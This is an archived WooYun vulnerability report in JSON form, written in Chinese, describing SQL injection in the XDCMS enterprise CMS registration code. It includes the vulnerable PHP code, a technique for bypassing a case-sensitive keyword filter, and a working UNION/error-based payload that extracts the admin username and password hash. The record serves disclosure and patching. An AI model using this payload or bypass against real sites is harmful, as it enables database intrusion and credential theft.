{"id": 60145, "wybug_id": "wooyun-2013-044556", "wybug_title": "XDCMS企业管理系统SQL注入#1", "wybug_corp": "www.xdcms.cn", "wybug_author": "xfkxfk", "wybug_date": "2013-12-02 10:12", "wybug_open_date": "2014-03-02 10:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "安全意识不足", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试", "后台验证绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向公众公开  简要描述： 最新版XDCMS企业管理系统，由于过滤不严，可绕过限制，导致多处SQL注入 详细说明：  注入在XDCMS企业管理系统的注册功能处，来看看\\system\\modules\\member\\index.php文件：注册时会调用register_save，问题就出在index.php的register_save函数处：\npublic function register_save(){\t\t$username=safe_html($_POST['username']);//获取UserName，这里用safe_html函数进行过滤\t\t$password=$_POST['password'];\t\t$password2=$_POST['password2'];\t\t$fields=$_POST['fields'];\t\tif(empty($username)||empty($password2)||empty($password)){\t\t\tshowmsg(C('material_not_complete'),'-1');\t\t}\t\tif(!strlength($username,5)){\t\t\tshowmsg(C('username').C('str_len_error').'5','-1');\t\t}\t\tif(!strlength($password,5)){\t\t\tshowmsg(C('password').C('str_len_error').'5','-1');\t\t}\t\tif($password!=$password2){\t\t\tshowmsg(C('password_different'),'-1');\t\t}\t\t$password=md5(md5($password));\t\t\t\t$user_num=$this->mysql->num_rows(\"select * from \".DB_PRE.\"member where `username`='$username'\");//判断会员是否存在，这里的UserName可被绕过过滤，导致注入，这是第一处SQL注入\t\tif($user_num>0){\t\t\tshowmsg(C('member_exist'),'-1');\t\t}\t\t$ip=safe_replace(safe_html(getip()));\t\t$this->mysql->db_insert('member',\"`username`='\".$username.\"',`password`='\".$password.\"',`creat_time`='\".datetime().\"',`last_ip`='\".$ip.\"',`is_lock`='0',`logins`='0',`groupid`='1'\");//插入主要字段——用户名、密码，这里的UserName同意造成注入，第二处sql注入\t\t$last_id=$this->mysql->insert_id();\t\t\t\t//插入附属字段\t\t$field_sql='';\t\tforeach($fields as $k=>$v){\t\t\t$f_value=$v;\t\t\tif(is_array($v)){\t\t\t\t$f_value=implode(',',$v);\t\t\t}\t\t\t$field_sql.=\",`{$k}`='{$f_value}'\";//这里没有过滤，直接进入了下面的update sql语句，导致第三处sql注入\t\t}\t\t$field_sql=substr($field_sql,1);\t\t$field_sql=\"update \".DB_PRE.\"member set {$field_sql} where userid={$last_id}\";\t\t$query=$this->mysql->query($field_sql);\t\t\t\tshowmsg(C('register_success'),'index.php?m=member&f=register');\t}\n   漏洞证明：  第一处sql注入，注册一个用户，然后抓包：\n\n最后看看结果，成功拿到了管理的用户名密码：\n\n在safe_html处虽然过了个SQL注入的敏感词，还过滤了=和*，但是没有考虑SQL注入敏感词的大小写，这里只过滤了小写，那么我们用大写绕过，这里过滤的=和*，我们可以使用不带*和=的常规保存SQL注入语句，EXP如下：\n在UserName处输入：' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,password) FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b#\n注入第三处的update SQL注入的利用可参考：\n WooYun: XDCMS订餐系统SQL注入 \n   修复方案：  过滤严格，增强safe_html的过滤规则   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-12-03 11:36 厂商回复： 这个是上次漏洞没更新注入过滤的版本 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}